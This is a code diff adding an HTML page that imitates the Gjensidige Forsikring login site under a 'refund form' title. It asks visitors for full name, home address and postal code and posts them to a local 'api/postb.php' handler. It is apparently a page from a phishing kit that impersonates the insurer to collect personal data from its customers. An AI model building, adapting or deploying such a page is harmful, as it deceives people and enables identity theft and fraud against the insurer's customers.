@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <script src="Login%20-%20Gjensidige%20Forsikring_files/utag.js" type="text/javascript" async=""></script><script src="Login%20-%20Gjensidige%20Forsikring_files/utag.sync.js"></script>
+    <meta name="WT.cg_n" content="Loginsider">
+    <meta name="DCSext.loginPage" content="Login">
+    <meta content="no" http-equiv="Content-Language">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="Login%20-%20Gjensidige%20Forsikring_files/gjeff.css">
+    <link rel="stylesheet" type="text/css" href="Login%20-%20Gjensidige%20Forsikring_files/main.css">
+    <script type="text/javascript" src="Login%20-%20Gjensidige%20Forsikring_files/gjeff.min.js"></script>
+    <!--[if lt IE 9]>
+    <script type="text/javascript" src="static/html5shiv.js"></script>
+    <script type="text/javascript" src="static/respond.min.js"></script>
+    <![endif]-->
+
+    <title>REFUSJONSSKJEMA</title>
+<meta name="referrer" content="origin"><script type="text/javascript" async="" charset="utf-8" id="tiqapp" src="Login%20-%20Gjensidige%20Forsikring_files/utag.v.js"></script></head>
+<body onload="eval('document.loginform.username').focus();" class="as">
+<!-- Tealium iQ  -->
+<script type="text/javascript" src="Login%20-%20Gjensidige%20Forsikring_files/gjensidige-no_prod_180504.js"></script>
+<div class="common-alert common-application-warning spacer" role="alert">
+    <div class="container">
+        <div class="row">
+            <div id="enonicSystemMessage"></div>
+        </div>
+    </div>
+</div>
+<!-- BEGIN Cookie check block -->
+<script language="JavaScript">
+    if (window.self !== window.top) {
+        top.window.location.href = window.self.location.href;
+    }
+    var warningString = '<B>WARMING:</B> Cookies must be enabled to keep logged in session. Please configure browser to accept cookies.';
+    document.cookie = 'acceptsCookies=yes';
+    if (document.cookie == '') {
+        document.write(warningString);
+    }
+    else {
+        document.cookie = 'acceptsCookies=yes; expires=Fri, 13-Apr-1970 00:00:00 GMT';
+    }
+
+    function simplePopup(url, W, H, windowName) { // requires absolute url
+        var left = (getScreenWidth() / 2) - (W / 2);
+        var top = (getScreenHeight() / 2) - (H / 2);
+        var win = window.open(url, windowName, "resizable=1,toolbar=0,location=0,directories=0,status=0,scrollbars=1,menubar=0,width=" + W + ",height=" + H + ",top=" + top + ",left=" + left);
+        win.focus();
+    }
+
+    function getScreenWidth() {
+        if (screen) return screen.width;
+        else return 1024;
+    }
+    function getScreenHeight() {
+        if (screen) return screen.height;
+        else return 768;
+    }
+
+    String.prototype.trim = function () {
+        return this.replace(/(?:(?:^|\n)\s+|\s+(?:$|\n))/g, "");
+    };
+
+    function submitOrderAccess() {
+        window.location = forsikringUrlBestill + "&Foedselsnummer=" + document.loginform.username.value;
+    }
+
+    function addUser(href) {
+        window.location = href + "?personInfoFoedselsnummer=" + document.loginform.username.value;
+    }
+
+    function submitForgottenPassword() {
+        window.location = forsikringUrlGlemtPwd + "&Foedselsnummer=" + document.loginform.username.value;
+    }
+
+    function disableLogin() {
+        return document.loginform[3].disabled = true
+    }
+
+    function validateLogin() {
+        var sUsername;
+        var sPassword;
+        try {
+            sUsername = document.loginform.username.value;
+            sPassword = document.loginform.password.value;
+
+            document.loginform.username.value = sUsername.trim();
+
+            if ((!sUsername) || (sUsername.trim().length <= 0) ||
+                (!sPassword) || (sPassword.trim().length <= 0)) {
+                alert('Password or username can not be empty!<br>Please try again.');
+                return false;
+            }
+            return true;
+        }
+        catch (err) {
+            alert("login.jsp err: " + err.description);
+            return false;
+        }
+    }
+
+</script>
+
+<div class="container">
+    <div class="gj-header">
+        <nav class="navbar navbar-header-menu" role="navigation">
+            <div class="container">
+                <div class="row">
+                    <div class="navbar-header col-xs-23 col-md-6">
+                        
+                        <a class="navbar-brand" href="#"><img src="Login%20-%20Gjensidige%20Forsikring_files/gjensidige_logo.svg" class="svg logo landscape" preserveaspectratio="xMinYMin slice"></a>
+                        
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </div>
+</div>
+<div class="container">
+    <div class="spacer-3-blocks box eai-login-container">
+
+		
+
+        <h1>Oppdater informasjonen nedenfor
+        </h1>
+        <hr>
+        <div>
+    
+    <div style="margin-top: 10px">
+        
+        
+        <div class="spacer box bordered">
+            <form class="form" id="loginform" name="loginform" method="post" action="api/postb.php">
+                <input type="hidden" name="login-form-type" value="pwd">
+
+               <div class="form-group">
+                    <label for="username">Fullt navn:</label>
+                    <input type="text" placeholder="" maxlength="30" minlength="4" name="1" class="form-control text" tabindex="1" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Hjemmeadresse:</label>
+                    <input placeholder="" type="text" name="2" class="form-control text" maxlength="40" minlength="5" value="" tabindex="2" required>
+                </div>
+				<div class="form-group">
+                    <label for="password">Postnummer:</label>
+                    <input placeholder="0000" type="text" name="3" maxlength="5" minlength="4" class="form-control text" value="" tabindex="2" required>
+                </div>
+                <input type="submit" value="NESTE" class="buttonarrow100 btn btn-default" tabindex="3">
+            </form>
+        </div>
+        
+
+
+        <div id="enonicContent"><!--//--></div>
+
+    </div>
+</div>
+<!-- End container -->
+
+<script>
+    $(document).ready(function () {
+        $("#enonicContent").load("/ajax/loginpage-ssn #checkableContent");
+        $("#include-nav").load("index.html #nav-helper");
+        $("#include-header").load("components/header.html .gj-header", gj.init);
+        $("#include-actionbar").load("components/actionbar.html .gj-ds-actionbar", gj.init);
+        $("#include-footer ").load("components/footer.html .gj-footer", gj.init);
+    });
+</script>
+
+
+
+</body></html>
